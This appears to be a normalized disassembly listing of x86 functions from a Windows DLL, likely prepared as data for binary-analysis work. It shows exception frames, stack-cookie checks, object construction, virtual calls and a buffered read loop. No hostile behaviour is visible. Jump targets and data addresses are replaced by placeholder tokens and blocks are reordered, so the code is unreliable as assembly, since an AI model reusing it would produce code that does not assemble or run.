push [ ebp + 0x8 ]
call sub_1001d0a0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10021370
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_1001d2a0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10021400
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fbd3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x34 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x50 ] 0x0
lea ecx [ esp + 0x28 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x3c ] 0xf
mov eax esi
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x34 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0xf ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ esp + 0xe ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
push 0x60
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x50 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x40 ]
mov esi esp
mov [ esp + 0x3c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x50 ] esp
push eax
call sub_10003600
mov [ esp + 0x80 ] 0x2
mov [ esp + 0x80 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x68 ] 0x3
movzx eax [ esp + 0x26 ]
push 0x1
push [ esp + 0x34 ]
push [ esp + 0x34 ]
push eax
movzx eax [ esp + 0x37 ]
push eax
push [ esp + 0x3c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x88 ] 0x1
mov ecx edi
call sub_1001d4a0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x50 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x50 ] 0xffffffff
cmp [ esp + 0x3c ] 0x10
jb r-xdata
sub_100215d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2c
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_1001d7a0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10021660
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fb83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x40 ] 0x0
lea edx [ esp + 0x18 ]
mov eax [ ecx ]
push edx
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x48
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x14 ] edi
mov [ esp + 0x40 ] 0x1
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x30 ]
mov esi esp
mov [ esp + 0x24 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x40 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x70 ] 0x2
mov [ esp + 0x70 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x58 ] 0x3
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x64 ] 0x1
mov ecx edi
call sub_1001d9a0
mov ecx eax
jmp r-xdata
mov [ esp + 0x40 ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x40 ] 0x0
test ecx ecx
jne r-xdata
mov [ esp + 0x2c ] 0xf
mov eax esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x24 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100217c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fc53
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x4034
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4030 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4048 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x10 ]
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x20 ] ebx
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x4050 ] 0x0
lea ecx [ esp + 0x24 ]
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ ebx ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
mov [ esp + 0x14 ] 0x0
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x38 ] 0xf
mov eax esi
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
mov ecx [ esp + 0x4048 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4030 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ rw-data ]
push 0x2c
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x14 ] edi
mov [ esp + 0x4050 ] 0x1
test edi edi
je r-xdata
mov ecx 0x57
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
xor ebx ebx
push 0x0
sub esp 0x18
mov esi esp
mov [ esp + 0x34 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x50 ] esp
push ebx
call sub_10001820
mov [ esp + 0x4084 ] 0x2
mov [ esp + 0x4084 ] 0x1
mov ecx esi
call sub_1003c0f0
add esp 0x18
mov [ esp + 0x406c ] 0x3
mov [ esp + 0x406c ] 0x1
mov ecx edi
call sub_1002b560
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x10 ]
xor edi edi
test eax eax
je r-xdata
mov [ esp + 0x4050 ] 0x0
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x4050 ] 0x4
test edi edi
je r-xdata
nop
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x3c ]
mov esi esp
mov [ esp + 0x30 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x44 ] esp
push eax
call sub_10003600
mov [ esp + 0x4080 ] 0x5
mov [ esp + 0x4080 ] 0x4
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x4068 ] 0x6
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x4078 ] 0x4
mov ecx edi
call sub_1001dc80
mov ecx eax
jmp r-xdata
mov eax [ ebx ]
push 0x1
jmp r-xdata
mov esi [ ebx ]
push eax
lea eax [ esp + 0x40 ]
push eax
call [ esi + 0xc ]
push eax
mov ecx ebx
call [ esi + 0x10 ]
mov ecx [ esp + 0x14 ]
cmp eax ecx
jne r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x4050 ] 0x0
test ecx ecx
je r-xdata
call [ eax ]
mov eax [ ebx ]
mov ecx ebx
push 0x1
mov eax [ esp + 0x10 ]
add edi ecx
cmp edi eax
jb r-xdata
mov [ esp + 0x4050 ] 0xffffffff
cmp [ esp + 0x38 ] 0x10
jb r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x3c ]
sub eax edi
mov esi 0x4000
cmp eax esi
cmovb esi eax
mov eax [ ecx ]
push esi
push edx
call [ eax + 0x4 ]
mov [ esp + 0x14 ] eax
mov ecx ebx
cmp eax esi
jne r-xdata
sub_10021a70
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fcc3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0x1
lea ecx [ esp + 0x38 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x60
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x60 ] 0x2
test edi edi
je r-xdata
mov [ esp + 0x4c ] 0xf
mov eax esi
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x3
sub esp 0x18
mov esi esp
mov [ esp + 0x40 ] esp
sub esp 0x18
lea eax [ esp + 0x80 ]
mov ecx esp
mov [ esp + 0x5c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xa8 ] 0x4
mov [ esp + 0xa8 ] 0x3
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x90 ] 0x5
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x9c ] 0x2
mov ecx edi
call sub_1001df80
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x60 ] 0x1
test ecx ecx
je r-xdata
mov [ esp + 0x60 ] 0x0
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_10021c80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd1b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x58 ] 0x1
lea edx [ esp + 0x18 ]
mov eax [ ecx ]
push edx
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x44
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x58 ] 0x2
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x30 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x3c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x88 ] 0x3
mov [ esp + 0x88 ] 0x2
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x70 ] 0x4
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x7c ] 0x2
mov ecx edi
call sub_1001e2e0
mov ecx eax
jmp r-xdata
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x58 ] 0x1
test ecx ecx
jne r-xdata
mov [ esp + 0x2c ] 0xf
mov eax esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x3c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10021e30
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_1001e570
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_10021fb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_1001e850
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_10022130
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fddb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0x1
lea ecx [ esp + 0x38 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x4c ] 0xf
mov eax esi
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x68
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x60 ] 0x2
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x30 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x3c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x90 ] 0x3
mov [ esp + 0x90 ] 0x2
mov ecx esi
call sub_1003c240
mov [ esp + 0x90 ] 0x4
mov esi esp
mov [ esp + 0x3c ] esp
lea eax [ esp + 0x68 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x5c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xa8 ] 0x5
mov [ esp + 0xa8 ] 0x4
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x90 ] 0x6
push 0x1
push [ esp + 0x44 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0xa0 ] 0x2
mov ecx edi
call sub_1001eb30
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x60 ] 0x1
test ecx ecx
je r-xdata
mov [ esp + 0x60 ] 0x0
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_10022370
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fddb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0x1
lea ecx [ esp + 0x38 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x4c ] 0xf
mov eax esi
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x64
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x60 ] 0x2
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x30 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x3c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x90 ] 0x3
mov [ esp + 0x90 ] 0x2
mov ecx esi
call sub_1003c240
mov [ esp + 0x90 ] 0x4
mov esi esp
mov [ esp + 0x3c ] esp
lea eax [ esp + 0x68 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x5c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xa8 ] 0x5
mov [ esp + 0xa8 ] 0x4
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x90 ] 0x6
push 0x1
push [ esp + 0x44 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0xa0 ] 0x2
mov ecx edi
call sub_1001eea0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
